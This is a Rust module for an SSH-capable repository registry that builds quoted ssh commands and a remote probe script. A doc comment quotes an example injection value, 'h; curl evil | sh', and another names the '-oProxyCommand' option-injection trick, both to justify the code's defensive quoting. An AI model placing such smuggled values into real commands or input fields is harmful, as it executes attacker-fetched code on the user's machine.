use std::path::{Path, PathBuf};

/// Scheme that marks a registry key as a remote (SSH) entry. A local entry is
/// always an absolute path, so the two can never collide (R4).
const REMOTE_KEY_SCHEME: &str = "ssh://";

/// Port assumed when the connection form leaves the port field blank.
pub const DEFAULT_SSH_PORT: u16 = 22;

/// Whether a registered path is a git repository or a plain folder.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum RepoEntryKind {
    Repo,
    Folder,
}

/// A registry entry identified by its canonical path.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct RepoEntry {
    pub path: PathBuf,
    pub display_name: String,
    pub kind: RepoEntryKind,
}

impl RepoEntry {
    pub fn from_path(path: impl AsRef<Path>) -> std::io::Result<Self> {
        let path = canonicalize_repo_path(path.as_ref())?;
        let display_name = display_name_for_path(&path);
        // A canonicalized path is local by construction — `canonicalize_repo_path`
        // rejects remote keys — so the fallback is unreachable in practice.
        let kind = classify_entry_kind(&path).unwrap_or(RepoEntryKind::Folder);
        Ok(Self {
            path,
            display_name,
            kind,
        })
    }
}

/// The five connection components a remote entry is built from. The registry
/// stores them encoded into a single self-describing key (KTD1) so remote and
/// local entries share one column and no migration is needed.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct RemoteTarget {
    pub server: String,
    pub port: u16,
    pub user: String,
    /// Local private-key path passed to `ssh -i`. Empty means "not specified".
    pub identity: String,
    /// Absolute path on the host, already `~`-expanded there (R3).
    pub remote_path: String,
}

impl RemoteTarget {
    /// The registry key for this target.
    pub fn key(&self) -> String {
        format_remote_key(
            &self.server,
            self.port,
            &self.user,
            &self.identity,
            &self.remote_path,
        )
    }

    /// Primary row label: the remote path's last component, or the host when
    /// the path has no leaf (R10).
    pub fn display_name(&self) -> String {
        self.remote_path
            .rsplit('/')
            .find(|segment| !segment.is_empty())
            .map(str::to_string)
            .unwrap_or_else(|| self.server.clone())
    }

    /// Secondary row label naming the machine (R10), and the `ssh` destination
    /// argument (U5/U7) — the same string in both roles.
    pub fn user_host(&self) -> String {
        format!("{}@{}", self.user, self.server)
    }
}

/// What the last SSH probe said about a remote entry.
///
/// Runtime-only and never persisted (R11): a restart brings every remote entry
/// back as [`RemoteProbeState::Pending`], and a stale entry is corrected by the
/// next probe rather than by a background check.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub enum RemoteProbeState {
    /// No probe has returned yet — the row renders pending (R9).
    #[default]
    Pending,
    Resolved {
        kind: RepoEntryKind,
        /// Current branch when the target is a repository (R8).
        branch: Option<String>,
    },
    Failed {
        reason: RemoteProbeFailure,
    },
}

impl RemoteProbeState {
    /// Repo-or-folder, known only once a probe has resolved. The local `.git`
    /// rules never answer for a remote entry (KTD2).
    pub fn kind(&self) -> Option<RepoEntryKind> {
        match self {
            Self::Resolved { kind, .. } => Some(*kind),
            Self::Pending | Self::Failed { .. } => None,
        }
    }
}

/// Why an add-time or reprobe SSH probe failed, mapped to what the user can do
/// about it (R7). A generic "failed" would strand the user on the
/// `BatchMode` false negatives, which the interactive tab would sail past.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum RemoteProbeFailure {
    /// No answer within the wall-clock timeout, or the connection was refused
    /// or reset (R6).
    Unreachable,
    /// The probe runs under `BatchMode=yes`, which turns an unknown host key or
    /// a passphrase-protected key with no loaded agent into a non-zero exit —
    /// even though the later interactive tab would prompt and succeed (KTD6).
    NeedsFirstHandConnect,
    /// The host answered, but the remote path is not there.
    PathNotFound,
    /// The `ssh` client could not be started on *this* machine, so nothing was
    /// ever sent to the host. Kept apart from [`Unreachable`] because the two
    /// point at opposite ends of the connection: the server is blameless here
    /// and the fix is local (a `PATH` without `ssh`, or no client installed).
    ///
    /// [`Unreachable`]: RemoteProbeFailure::Unreachable
    SshUnavailable,
}

impl RemoteProbeFailure {
    /// Short inline label for the sidebar row, where the full [`message`] would
    /// not fit. The row's tooltip carries the message.
    ///
    /// [`message`]: RemoteProbeFailure::message
    pub fn short_label(&self) -> &'static str {
        match self {
            Self::Unreachable => "Unreachable",
            Self::NeedsFirstHandConnect => "Needs first connection",
            Self::PathNotFound => "Path not found",
            Self::SshUnavailable => "No ssh client",
        }
    }

    /// Row tooltip / form banner text.
    pub fn message(&self) -> &'static str {
        match self {
            Self::Unreachable => "Host did not respond — check the server, port, and network.",
            Self::NeedsFirstHandConnect => {
                "Connect once by hand first — the host key is unknown or the key is locked."
            }
            Self::PathNotFound => "That path does not exist on the host.",
            Self::SshUnavailable => {
                "Warp could not start ssh on this machine — nothing was sent to the host."
            }
        }
    }
}

/// Encode a remote connection as a registry key:
/// `ssh://<user>@<host>:<port><path>?i=<identity>`.
///
/// Every free-text segment is percent-encoded and an IPv6 host is bracketed, so
/// no byte of a user, path, or identity can be read back as a `@`, `:`, `?`, or
/// `#` delimiter (KTD1). A raw delimiter would not fail loudly — it would parse
/// into a *different* connection.
pub fn format_remote_key(
    server: &str,
    port: u16,
    user: &str,
    identity: &str,
    remote_path: &str,
) -> String {
    let host = if server.contains(':') {
        // IPv6 literal: bracket it, keeping the address colons literal so they
        // stay readable and cannot be confused with the `:port` delimiter.
        format!("[{}]", percent_encode(server, b":"))
    } else {
        percent_encode(server, b"")
    };
    let mut key = format!(
        "{REMOTE_KEY_SCHEME}{user}@{host}:{port}{path}",
        user = percent_encode(user, b""),
        path = percent_encode(remote_path, b"/"),
    );
    if !identity.is_empty() {
        key.push_str("?i=");
        key.push_str(&percent_encode(identity, b"/"));
    }
    key
}

/// Inverse of [`format_remote_key`]. `None` for anything that is not a
/// well-formed remote key, including a local path.
pub fn parse_remote_key(key: &str) -> Option<RemoteTarget> {
    let rest = key.strip_prefix(REMOTE_KEY_SCHEME)?;
    // Free-text `?` is encoded, so the first raw one is the query delimiter.
    let (rest, identity) = match rest.split_once('?') {
        Some((head, query)) => (head, percent_decode(query.strip_prefix("i=")?)?),
        None => (rest, String::new()),
    };
    let (authority, remote_path) = match rest.find('/') {
        Some(index) => (&rest[..index], percent_decode(&rest[index..])?),
        None => (rest, String::new()),
    };
    let (user, host_port) = authority.split_once('@')?;
    let (server, port) = match host_port.strip_prefix('[') {
        Some(after_bracket) => {
            let (host, tail) = after_bracket.split_once(']')?;
            (percent_decode(host)?, tail.strip_prefix(':')?)
        }
        None => {
            let (host, port) = host_port.rsplit_once(':')?;
            (percent_decode(host)?, port)
        }
    };
    Some(RemoteTarget {
        server,
        port: port.parse().ok()?,
        user: percent_decode(user)?,
        identity,
        remote_path,
    })
}

/// True for a remote registry key. Local entries are absolute paths, so this is
/// the locality discriminator every filesystem rule below branches on.
pub fn is_remote_key(key: &str) -> bool {
    key.starts_with(REMOTE_KEY_SCHEME)
}

/// [`is_remote_key`] for a registry key carried as a `Path`.
pub fn is_remote_path(path: &Path) -> bool {
    path.to_str().is_some_and(is_remote_key)
}

/// Wrap `value` in single quotes for a shell command line.
///
/// Applied wherever a user-entered path reaches a shell or the interactive
/// `ssh` line (KTD10). An unquoted space in the identity path word-splits into
/// a second positional argument, which trips the warpification gate in
/// `bash_body.sh` and *silently* drops warpification (R13 lost, no error).
pub fn shell_quote(value: &str) -> String {
    let mut quoted = String::with_capacity(value.len() + 2);
    quoted.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            quoted.push_str(r"'\''");
        } else {
            quoted.push(ch);
        }
    }
    quoted.push('\'');
    quoted
}

/// Remote command the probe runs. `sh -s` reads the script from stdin, so the
/// script never becomes an `ssh` argument (KTD6) and the host's login shell —
/// which may be fish or csh — never has to parse it. `sh` rather than `bash`
/// because the script is POSIX and `sh` is the one shell every target has.
pub const REMOTE_PROBE_SHELL_COMMAND: &str = "sh -s";

/// What the probe found at the remote path.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum RemoteProbeOutcome {
    Found {
        /// The path as the *host* expanded it (R3) — what the entry stores.
        remote_path: String,
        kind: RepoEntryKind,
        branch: Option<String>,
    },
    /// The host answered, but nothing is at that path.
    Missing,
}

/// `ssh` argv for the add-time probe.
///
/// Built as argv and never as a shell string, and the destination is fenced
/// with `--` so a user or host beginning with `-` lands as a destination rather
/// than an option such as `-oProxyCommand=…`, which `BatchMode` does not stop
/// (KTD10). Host-key checking stays at its secure default: an unknown host is a
/// surfaced failure the user clears by connecting once by hand, never a key
/// this probe accepts on their behalf (KTD6).
pub fn remote_probe_args(target: &RemoteTarget, connect_timeout_secs: u64) -> Vec<String> {
    let mut args = vec![
        "-o".to_string(),
        // No password prompt: an unreachable or unauthenticated host has to
        // fail rather than block on a prompt nothing can answer (R6).
        "BatchMode=yes".to_string(),
        "-o".to_string(),
        format!("ConnectTimeout={connect_timeout_secs}"),
        "-p".to_string(),
        target.port.to_string(),
    ];
    if !target.identity.is_empty() {
        args.push("-i".to_string());
        args.push(target.identity.clone());
    }
    args.push("--".to_string());
    args.push(target.user_host());
    args.push(REMOTE_PROBE_SHELL_COMMAND.to_string());
    args
}

/// The script piped to the host, answering R3 (expand `~` there) and R8
/// (repository or folder, and the branch) in one round trip.
///
/// POSIX only — no bashisms — and `remote_path` is shell-quoted (KTD10)
/// because it is user-entered text landing in a shell.
pub fn remote_probe_script(remote_path: &str) -> String {
    format!(
        r#"p={path}
case "$p" in
  '~') p="$HOME" ;;
  '~/'*) p="$HOME/${{p#\~/}}" ;;
esac
if [ ! -d "$p" ]; then
  printf 'missing\n'
  exit 0
fi
cd "$p" || {{ printf 'missing\n'; exit 0; }}
printf 'path %s\n' "$PWD"
if [ -e .git ]; then
  printf 'kind repo\n'
  b=$(git rev-parse --abbrev-ref HEAD 2>/dev/null) || b=''
  if [ -n "$b" ]; then
    printf 'branch %s\n' "$b"
  fi
else
  printf 'kind folder\n'
fi
"#,
        path = shell_quote(remote_path),
    )
}

/// The interactive `ssh` line a remote entry's tab runs (R12/R13).
///
/// Shaped so Warp's own SSH wrapper still recognises it: `-i`/`-p` are getopts
/// options and `--` fences a *single* positional destination, which is what the
/// warpification gate in `bash_body.sh` requires. It deliberately does not
/// append the remote path as a command: a second positional would silently drop
/// warpification, so U7 lands in the path afterwards instead.
///
/// Every user-entered value is quoted (KTD10). This string is typed into the
/// *local* shell, so an unquoted field is direct command execution, not merely a
/// word-splitting hazard — `server = "h; curl evil | sh"` would run. Quoting is
/// safe for warpification because `is_interactive_ssh_session` in
/// `bash_body.sh` counts positionals *after* the shell has word-split and
/// stripped quotes, so a quoted destination is still exactly one `ARGS` entry.
pub fn remote_ssh_command(target: &RemoteTarget) -> String {
    let mut command = String::from("ssh");
    if !target.identity.is_empty() {
        command.push_str(" -i ");
        command.push_str(&shell_quote(&target.identity));
    }
    command.push_str(&format!(" -p {} -- ", target.port));
    command.push_str(&shell_quote(&target.user_host()));
    command
}

/// The command that lands the connected tab in the entry's path (R12), run in
/// the remote shell once it is ready — never appended to [`remote_ssh_command`].
///
/// The path is shell-quoted because it is user-entered text reaching a shell
/// (KTD10); a remote path with a space stays one argument.
pub fn remote_cd_command(remote_path: &str) -> String {
    format!("cd {}", shell_quote(remote_path))
}

/// Parse the probe script's stdout. `None` when the output is empty or does not
/// carry a kind: an unresolved entry is better than one claiming a kind nothing
/// confirmed.
pub fn parse_probe_output(stdout: &str) -> Option<RemoteProbeOutcome> {
    let mut remote_path = None;
    let mut kind = None;
    let mut branch = None;
    for line in stdout.lines() {
        let line = line.trim_end_matches(['\r', '\n']);
        if line == "missing" {
            return Some(RemoteProbeOutcome::Missing);
        } else if let Some(value) = line.strip_prefix("path ") {
            remote_path = Some(value.to_string());
        } else if let Some(value) = line.strip_prefix("kind ") {
            kind = match value {
                "repo" => Some(RepoEntryKind::Repo),
                "folder" => Some(RepoEntryKind::Folder),
                _ => None,
            };
        } else if let Some(value) = line.strip_prefix("branch ") {
            branch = Some(value.to_string());
        }
    }
    Some(RemoteProbeOutcome::Found {
        remote_path: remote_path?,
        kind: kind?,
        branch,
    })
}

/// Map a failed probe to what the user can actually do about it (R7).
///
/// `BatchMode=yes` collapses every interactive prompt into a non-zero exit, so
/// an unknown host key or a passphrase-protected key looks identical to a dead
/// host at the exit-code level — even though the interactive tab (no
/// `BatchMode`) would prompt and succeed. The stderr text is what separates
/// them (KTD6).
pub fn classify_probe_failure(_exit_code: Option<i32>, stderr: &str) -> RemoteProbeFailure {
    const FIRST_HAND_MARKERS: [&str; 7] = [
        "host key verification failed",
        "authenticity of host",
        "permission denied",
        "enter passphrase",
        "no matching host key",
        "too many authentication failures",
        "remote host identification has changed",
    ];
    let stderr = stderr.to_ascii_lowercase();
    if FIRST_HAND_MARKERS
        .iter()
        .any(|marker| stderr.contains(marker))
    {
        return RemoteProbeFailure::NeedsFirstHandConnect;
    }
    RemoteProbeFailure::Unreachable
}

/// Canonicalize `path` for registry identity (dedup trailing slash / symlink
/// variants). Errors for a remote key: it names a directory on another machine
/// and must be stored verbatim (KTD3).
pub fn canonicalize_repo_path(path: &Path) -> std::io::Result<PathBuf> {
    if is_remote_path(path) {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "remote registry key is not a local path",
        ));
    }
    dunce::canonicalize(path)
}

/// Basename used as the primary row label for a local entry.
pub fn display_name_for_path(path: &Path) -> String {
    path.file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| path.to_string_lossy().into_owned())
}

/// Row/group label for any registry key, local path or remote key alike.
pub fn display_name_for_registry_path(path: &Path) -> String {
    path.to_str()
        .filter(|key| is_remote_key(key))
        .and_then(parse_remote_key)
        .map(|target| target.display_name())
        .unwrap_or_else(|| display_name_for_path(path))
}

/// Classify as repo when `.git` exists as a file or directory (covers linked
/// worktrees). `None` for a remote key — its kind comes from the SSH probe, and
/// a `.git` stat against the local filesystem would answer about the wrong
/// machine (KTD2).
pub fn classify_entry_kind(path: &Path) -> Option<RepoEntryKind> {
    if is_remote_path(path) {
        return None;
    }
    let git = path.join(".git");
    Some(if git.exists() {
        RepoEntryKind::Repo
    } else {
        RepoEntryKind::Folder
    })
}

/// True when the path no longer exists on disk. Always false for a remote key:
/// remote entries are never polled for liveness, and displayed state comes from
/// the last probe (R11).
pub fn is_dead_path(path: &Path) -> bool {
    if is_remote_path(path) {
        return false;
    }
    !path.exists()
}

const HEX_DIGITS: &[u8; 16] = b"0123456789ABCDEF";

/// Percent-encode everything outside the RFC 3986 unreserved set, keeping the
/// bytes in `extra_safe` literal for readability (`/` inside a path, `:` inside
/// a bracketed IPv6 host).
fn percent_encode(value: &str, extra_safe: &[u8]) -> String {
    let mut encoded = String::with_capacity(value.len());
    for &byte in value.as_bytes() {
        if byte.is_ascii_alphanumeric()
            || matches!(byte, b'-' | b'.' | b'_' | b'~')
            || extra_safe.contains(&byte)
        {
            encoded.push(byte as char);
        } else {
            encoded.push('%');
            encoded.push(HEX_DIGITS[(byte >> 4) as usize] as char);
            encoded.push(HEX_DIGITS[(byte & 0x0f) as usize] as char);
        }
    }
    encoded
}

/// Inverse of [`percent_encode`]. `None` for a truncated or non-hex escape, or
/// for bytes that do not decode as UTF-8 — a malformed key is rejected rather
/// than silently repaired into a different connection.
fn percent_decode(value: &str) -> Option<String> {
    let bytes = value.as_bytes();
    let mut decoded = Vec::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'%' {
            let high = hex_value(*bytes.get(index + 1)?)?;
            let low = hex_value(*bytes.get(index + 2)?)?;
            decoded.push((high << 4) | low);
            index += 3;
        } else {
            decoded.push(bytes[index]);
            index += 1;
        }
    }
    String::from_utf8(decoded).ok()
}

fn hex_value(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        b'A'..=b'F' => Some(byte - b'A' + 10),
        _ => None,
    }
}

#[cfg(test)]
#[path = "entry_tests.rs"]
mod tests;
